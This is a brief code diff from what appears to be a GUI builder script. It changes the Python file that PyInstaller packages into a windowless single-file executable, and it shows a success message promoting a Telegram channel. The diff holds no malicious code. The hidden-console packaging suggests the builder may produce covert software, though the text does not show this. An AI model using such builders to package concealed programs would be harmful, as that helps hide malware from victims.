@@ -67,7 +67,7 @@ def build_exe():
         messagebox.showinfo("Information", message)
 
         dist_path = os.path.join(os.getcwd(), "dist")
-        build_command = f'pyinstaller twinknew.py --noconsole --onefile{icon_option}'
+        build_command = f'pyinstaller creal.py --noconsole --onefile{icon_option}'
         os.system(build_command)
 
         messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
